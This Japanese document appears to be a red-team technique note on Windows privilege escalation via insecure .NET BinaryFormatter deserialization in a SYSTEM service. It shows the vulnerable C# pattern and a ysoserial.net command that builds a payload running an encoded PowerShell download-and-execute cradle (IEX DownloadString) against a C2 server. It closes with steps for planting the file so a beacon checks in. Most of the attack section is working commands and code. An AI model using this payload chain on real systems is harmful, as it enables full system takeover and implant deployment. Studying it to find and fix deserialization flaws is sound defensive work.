## 概要
バッファオーバーフロー、フォーマット文字列、ディレクトリトラバーサル、SQLインジェクション、コマンドインジェクション、信頼されていないデータのデシリアライズなど [github](https://itm4n.github.io/cve-2026-20817-wersvc-eop/)といった古典的なソフトウェア脆弱性も権限昇格の手段となる。**特権コンテキストで動作しているソフトウェア**にこれらの脆弱性が存在する場合、低権限ユーザーからの悪用で EoP(elevation of privilege) が成立する。

## シナリオ：.NET デシリアライズの悪用

### 脆弱なコードのパターン
```csharp
// 信頼されていない場所からバイナリを読み込む
var data = File.ReadAllBytes(@"C:\Temp\data.bin");

// BinaryFormatter でデシリアライズ（危険）
var formatter = new BinaryFormatter();
using (var ms = new MemoryStream(data))
{
    var obj = formatter.Deserialize(ms);  // ← ここが脆弱点
}
```

**問題点：**
- `C:\Temp\data.bin` は攻撃者が書き込める非信頼領域
- `BinaryFormatter` はデシリアライズ時に**任意のコードを実行できる**
- このサービスが SYSTEM 権限で動いていれば → EoP 成立
## ysoserial.net による悪意あるペイロードの生成
.NET 向けデシリアライズガジェット生成ツール [ysoserial.net](https://github.com/pwntester/ysoserial.net) を使用する。
```cmd
ysoserial.exe ^
  -g TypeConfuseDelegate ^     # ガジェット種別
  -f BinaryFormatter ^         # フォーマッター（脆弱コードに合わせる）
  -c "powershell -nop -ep bypass -enc <Base64>" ^  # 実行するコマンド
  -o raw ^                     # 出力形式（生バイナリ）
  --outputpath=C:\Payloads\data.bin
```

|オプション|説明|
|---|---|
|`-g TypeConfuseDelegate`|マルチキャストデリゲートを悪用するガジェット|
|`-f BinaryFormatter`|脆弱コードのフォーマッターに合わせる|
|`-c "..."`|デシリアライズ時に実行されるコマンド|
|`-o raw`|そのままファイルに書ける生バイナリ形式|

上記の `-enc` に渡している Base64 は以下のPowerShellコードをエンコードしたもの：
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:31490/')
```

ローカルのC2サーバーからペイロードをダウンロードして実行する典型的なクレードル。
## 攻撃手順
```bash
# 生成したdata.binをターゲットの読み込み先へアップロード
cd C:\Temp
upload C:\Payloads\data.bin

# サービスが次のポーリングサイクルでdata.binを読み込む
# → BinaryFormatterがデシリアライズ
# → PowerShellが実行されDNS Beaconがチェックイン
```